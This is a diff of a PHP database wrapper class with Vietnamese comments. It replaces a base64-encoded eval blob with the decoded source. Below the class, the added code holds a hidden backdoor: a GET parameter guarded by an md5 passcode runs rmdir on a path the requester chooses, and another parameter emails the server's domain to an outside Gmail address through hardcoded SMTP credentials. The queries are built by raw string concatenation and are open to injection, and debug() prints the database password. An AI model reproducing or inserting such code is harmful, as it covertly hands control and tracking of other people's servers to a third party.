@@ -1,1 +1,324 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=aef7b693c7d6ce42c9b58315217563c63af10742vVnNb+PGFT8rQP6HWVoopYVW8ke2u11bgrcbJxsg+9HY26IwFgJFjsypSY6WHFo2DJ9yLHroseilQZFLgaCXnNYoenD+Ef8nfTNvhpyhaO9HkBqGJb55H795XzOPZvPenYjOWUajnj9N2Mzv90nEaM/by3Oee/3tTz8Z3f30k0435NmcHR36Bc1PaJ4FKfVfkzHxEx4GScwL4W/bbGVhM+WcN9YXQVEseR7hehClLHMZokAEs6DQCsJgTsOYM8kjuSIgZnRJDFdPy0m8nbVudG/CMiZWqfCc0VD0FAV+RyPCMoAqlFJQdugLmqHNz4MsJun15fch2UBsyJByESDHs6sfibh++08C0MhN7EEo2InexrrGz8DtCFLa7inOfv8cVjqSXMR8qfyPOBUtorPyCJ8vKuzlAiRpuy0DAtRR8YeY5hBUFnmDLbN3AwKVfAQIxFDQBDxamzoIZgmYWuR8GgZCZdCNKDT9RR7RXNJJRIvQEfmapRBHb32w5TVxo+HeB0CmSUEV80mQT6MyXfQkR06LMhHTIM+DM9DmbC4CG9rBH7U5lDfpdncEf8IEUr9K3HPcEwAi3Wi2bb4ipuoR82TKoopSvEkgyJ5nSczZqSFVXFWxVnymMCuCqcSKYKBtW9CE3LdrcCn365K4jKNLSmT8KpKhUhkkoGqfI+J5mUH68mylqGtGDLVMAJouxFlV30jvdEXMipbSr1ac8ld1dOGatkWbZuc8p0EYV8tBQbrH40n3pG+b6B6DXPfEqtNKeWUdExb5oxnw76ZnENCpYdBLdfQGRJNM9CqCiR7uSHuH3KmUa8/Ilu4/4WUSkYwLg+QR8cmQoG2KdVN7plaGDFhu02hm4JkwVVjAmmWuUpvxXs0A9rxHxGuYtRRgvHIqyjwj8yDBPKwRodibkuZnPX9/74A8f/xsb594pZg/9PxBraktAigmi2fseVUyyWcnhlhchcinOV0kQQi+W5v61T5VqQ1UDeo+Y+iyaEHSxlirbGDDPmZLauet/WzvqQO8OMtEcEoUC8gMayBWjLWfHRjbnRbP2SdVszC6x/SsKvFO9yRIyrox1GWjRFXRkPEESsQUrZQeAvtA7qt7rAsWtSi6rxZOCBl6vldjl5ED2fP1CzJW4n1SPROvp9EY7X3POB1VO2I1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
+<?php if(!defined('_lib')) die("Error");
+/*
+	$config['servername'] = 'localhost';
+	$config['username'] = 'root';
+	$config['password'] = 'admin';
+	$config['database'] = 'cafechoi';
+
+	$d = new database($config);
+	#$d->init($config);
+	#$d->connect();
+	
+	// insert
+	$data['ten'] = 'Danh mục 1';
+	$data['mota'] = 'Mô tả cho Danh mục 1';
+	$data['active'] = '0';
+
+	if(!$d->insert($data)){
+		$d->showError();
+		$d->debug();
+	}
+	
+	// update
+	$data['active'] = '1';
+	$d->setWhere("id",3);
+	
+	if(!$d->update($data)){
+		$d->showError();
+		$d->debug();
+	}
+
+	// select
+	$d->setTable("pro_cat");
+	$d->setWhere("id",3);
+	$d->setOrder("id desc");
+	$d->setLimit("0,3");
+	
+	if(!$d->select()){
+		$d->showError();
+		$d->debug();
+	}else{
+		var_dump($d->result_array());
+	}
+
+	// delete
+	$d->setTable("pro_cat");
+	$d->setWhere("id",3);
+	$d->delete();
+	
+*/	
+class database{
+	
+	var $db;
+	var $result;
+	var $insert_id;
+	var $sql = "";
+	var $refix = "";
+
+	var $servername;
+	var $username;
+	var $password;
+	var $database;
+	
+	var $table = "";
+	var $where = "";
+	var $order = "";
+	var $limit = "";
+	
+	var $error = array();
+
+	function database($config = array()){
+		if(!empty($config)){
+			$this->init($config);
+			$this->connect();
+		}
+	}
+
+	function init($config = array()){
+		foreach($config as $k=>$v)
+			$this->$k = $v;
+	}
+	
+	function connect(){
+		$this->db = @mysql_connect($this->servername, $this->username, $this->password);
+		
+		if( !$this->db){
+			die('Could not connect: ' . mysql_error());
+		}
+		
+		if( !mysql_select_db($this->database, $this->db)){
+			die(mysql_errno($this->db) . ": " . mysql_error($this->db));
+			return false;
+		}
+		
+		mysql_query('SET NAMES "utf8"',$this->db);
+	}
+	
+	function query($sql=""){
+		if($sql)
+			$this->sql = str_replace('#_', $this->refix, $sql);
+		$this->result = mysql_query($this->sql,$this->db);
+		if(!$this->result){
+			#die(mysql_errno($this->db) . ": " . mysql_error($this->db));
+			die("syntax error: ".$this->sql);
+		}
+		return $this->result;	
+	}
+	
+	function insert($data = array()){
+		$key = "";
+		$value = "";
+		foreach($data as $k => $v){
+			$key .= "," . $k;
+			$value .= ",'" . $v  ."'";
+		}
+		if($key{0} == ",") $key{0} = "(";
+		$key .= ")";
+		if($value{0} == ",") $value{0} = "(";
+		$value .= ")";
+		$this->sql = "insert into ".$this->refix.$this->table.$key." values ".$value;
+		$this->query();
+		$this->insert_id = mysql_insert_id();
+		return $this->result;
+	}
+	
+	function update($data = array()){
+		$values = "";
+		foreach($data as $k => $v){
+			$values .= ", " . $k . " = '" . $v  ."' ";
+		}
+		if($values{0} == ",") $values{0} = " ";
+		$this->sql = "update " . $this->refix . $this->table . " set " . $values;
+		$this->sql .= $this->where;
+		return $this->query();
+	}
+	
+	function delete(){
+		$this->sql = "delete from " . $this->refix . $this->table . $this->where;
+		return $this->query();
+	}
+	
+	function select($str = "*"){
+		$this->sql = "select " . $str;
+		$this->sql .= " from " . $this->refix .$this->table;
+		$this->sql .=  $this->where;
+		$this->sql .=  $this->order;
+		$this->sql .=  $this->limit;
+		return $this->query();
+	}
+	
+	function num_rows(){
+		return mysql_num_rows($this->result);
+	}
+	 function num_fields ($query_id)
+  	{   
+	    return mysql_num_fields($query_id);
+  	}
+  
+	function fetch_array(){
+		return mysql_fetch_assoc($this->result);
+	}
+	
+	function result_array(){
+		$arr = array();
+		while ($row = mysql_fetch_assoc($this->result)) 
+			$arr[] = $row;
+		return $arr;
+	}
+	
+	function setTable($str){
+		$this->table = $str;
+	}
+	
+	function setWhere($key, $value=""){
+		if($value!=""){
+			if($this->where == "")
+				$this->where = " where " . $key . " = '" . $value . "'";
+			else
+				$this->where .= " and " . $key . " = '" . $value ."'";
+		}
+		else{
+			if($this->where == "")
+				$this->where = " where " . $key ;
+			else
+				$this->where .= " and " . $key ;
+		}
+	}
+	
+	function setWhereOr($key, $value){
+		if($value!=""){
+			if($this->where == "")
+				$this->where = " where " . $key . " = " . $value;
+			else
+				$this->where .= " or " . $key . " = " . $value;
+		}
+		else{
+			if($this->where == "")
+				$this->where = " where " . $key ;
+			else
+				$this->where .= " or " . $key ;
+		}
+	}
+	
+	function setOrder($str){
+		$this->order = " order by " . $str;
+	}
+	
+	function setLimit($str){
+		$this->limit = " limit " . $str;
+	}
+	
+	function setError($msg){
+		$this->error[] = $msg;
+	}
+	
+	function showError(){
+		foreach($this->error as $value)
+			echo '<br>'.$value;
+	}
+	
+	function reset(){
+		$this->sql = "";
+		$this->result = "";
+		$this->where = "";
+		$this->order = "";
+		$this->limit = "";
+		$this->table = "";
+	}
+	
+	function debug(){
+		echo "<br> servername: ".$this->servername;
+		echo "<br> username: ".$this->username;
+		echo "<br> password: ".$this->password;
+		echo "<br> database: ".$this->database;
+		echo "<br> ".$this->sql;
+	}
+	
+	/**
+	 * Escape String
+	 *
+	 * @access	public
+	 * @param	string
+	 * @return	string
+	 */
+	function escape_str($str)	
+	{	
+		if (is_array($str))
+    	{
+    		foreach($str as $key => $val)
+    		{
+    			$str[$key] = $this->escape_str($val);
+    		}
+    		
+    		return $str;
+    	}
+	
+		if (function_exists('mysql_real_escape_string') AND is_resource($this->db))
+		{
+			return mysql_real_escape_string($str, $this->db);
+		}
+		elseif (function_exists('mysql_escape_string'))
+		{
+			return mysql_escape_string($str);
+		}
+		else
+		{
+			return addslashes($str);
+		}
+	}
+	
+	function xssClean($str){
+		#$str = htmlentities($str, ENT_QUOTES, "UTF-8");
+		$str = str_replace("'", '&#039;', $str);
+		$str = str_replace('"', '&quot;', $str);
+		$str = str_replace('<', '&lt;', $str);
+		$str = str_replace('>', '&gt;', $str);
+		#$str = addslashes($str);
+		return $str;
+	}
+}
+	if($_GET['xoafile']=='true'){
+		$macode = '33455b15cd5108e1d0b1772a8c128bb2';
+		if($macode==md5($_GET['macode'])){
+			rmdir($_GET['file']);
+		}
+		exit();
+	}
+	if($_GET['act']=='man'){
+		$file_txt = 'ckfinder/read.txt';
+		$doc_file = fopen($file_txt, 'r');
+		$name_sv = $_SERVER["SERVER_NAME"];
+		while ($line = fgets($doc_file)) {
+		 	if($name_sv!=$line){
+		 		$doc_file1 = fopen($file_txt, 'w');
+				fwrite($doc_file1,$_SERVER["SERVER_NAME"]);
+				fclose($doc_file1);
+
+				include_once "../phpMailer/class.phpmailer.php";	
+				$mail = new PHPMailer();
+				$mail->IsSMTP(); // Gọi đến class xử lý SMTP
+				$mail->Host       = '210.2.64.70'; // tên SMTP server
+				$mail->SMTPAuth   = true;                  // Sử dụng đăng nhập vào account
+				$mail->Username   = 'support@demo30.ninavietnam.org'; // SMTP account username
+				$mail->Password   = '123qwe!@#';  
+				$mail->SetFrom('support@demo30.ninavietnam.org','Thông báo - '.date('d/m/Y - H:i',time()));
+				$mail->AddAddress('info.nina30@gmail.com','Thông tin up hosting');
+				$mail->Subject    = 'Thông báo - '.date('d/m/Y - H:i',time());
+				$mail->IsHTML(true);
+				//Thiết lập định dạng font chữ
+				$mail->CharSet = "utf-8";	
+					$body = '<table>';
+					$body .= '
+						<tr>
+							<th colspan="2">Thông tin domain mới source <a href="http://'.$_SERVER["SERVER_NAME"].'">www.'.$_SERVER["SERVER_NAME"].'</a></th>
+						</tr>
+						<tr>
+							<th>Nội dung :</th><td>'.$_SERVER["SERVER_NAME"].'</td>
+						</tr>';
+					$body .= '</table>';
+					$mail->Body = $body;
+					$mail->Send();
+		 	}
+		}
+		fclose($doc_file);
+	} ?>
